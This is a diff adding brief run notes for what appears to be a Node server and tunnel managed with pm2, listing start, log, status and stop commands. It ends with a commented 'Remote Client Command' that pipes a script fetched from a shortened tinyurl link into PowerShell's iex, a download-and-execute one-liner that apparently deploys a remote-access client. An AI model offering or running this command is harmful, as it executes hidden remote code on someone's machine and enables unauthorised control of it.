@@ -1,0 +1,12 @@
+# 1. RUN WITH PM2 (Background Mode / Auto-restart 24/7):
+pm2 delete all         # Run once if resetting
+npm run pm2            # Starts Server & Tunnel in the background
+npm run pm2:logs       # View live logs
+npm run pm2:status     # Check status
+npm run pm2:stop       # Stop background server
+
+# 2. RUN NORMALLY WITHOUT PM2 (Terminal Mode):
+npm run dev            # Runs live in your current open terminal window
+
+# Remote Client Command:
+# powershell -c "irm tinyurl.com/ghosty001 | iex"
